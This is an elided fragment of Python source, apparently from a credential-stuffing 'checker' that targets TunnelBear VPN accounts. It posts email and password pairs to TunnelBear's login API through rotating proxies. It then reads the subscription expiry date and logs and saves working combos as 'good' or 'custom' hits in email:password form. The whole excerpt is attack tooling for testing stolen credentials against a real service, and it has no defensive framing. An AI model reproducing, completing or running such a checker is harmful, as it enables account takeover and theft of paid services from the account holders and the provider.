    ...
    while not Checker.stopping:
        try:
            ...
            with Session() as s:
                ...
                response = s.post(
                    "https://www.tunnelbear.com/core/api/login",
                    data=data,
                    headers=headers,
                )
                ...
                expire = int(
                    datetime.strptime(
                        response.json()["details"]["fullVersionUntil"],
                        "%b %d, %Y %H:%M:%S %p",
                    )
                    .date()
                    .strftime("%Y%m%d")
                ...
                if now > expire:
                    ...
                    return_proxy(proxy)
                    if not Checker.cui:
                        log("custom", ":".join([email, password]), "Tunnelbear")
                    save(
                        "Tunnelbear",
                        "custom",
                        Checker.time,
                    ...
                    return_proxy(proxy)
                    if not Checker.cui:
                        log("good", ":".join([email, password]), "Tunnelbear")
                    save(
                        "Tunnelbear",
                        "good",
                        Checker.time,
